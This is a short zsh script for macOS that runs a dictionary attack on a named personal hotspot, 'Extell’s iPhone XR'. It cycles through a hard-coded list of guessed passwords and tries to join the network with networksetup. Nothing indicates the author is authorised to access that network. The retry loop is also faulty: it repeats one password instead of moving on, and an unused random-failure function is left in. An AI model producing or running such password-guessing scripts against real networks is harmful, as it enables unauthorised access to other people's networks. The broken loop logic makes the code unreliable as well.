#!/bin/zsh

# Simulate an external command that randomly fails
function external_command {
    if [ $[ $RANDOM % $1 ] -eq 0 ] ; then
        echo "succeed"
        return 0
    else
        echo "failed"
        return 1
    fi
}

# Iterate over your predefined tests
for i in daniel babygirl xrpkzg3qzcchf moosical turbodash ; do
    # airport -s;
    # Retry logic
    while
        echo -n "Trying password $i... "
        # Call the external command
        # didnt have right type of apostrophe before! gotta use "option+shift+]"
        networksetup -setairportnetwork en0 "Extell’s iPhone XR" $i 
        # $? is the return code, 0 if successful
        [ $? -ne 0 ]
    do true ; done
done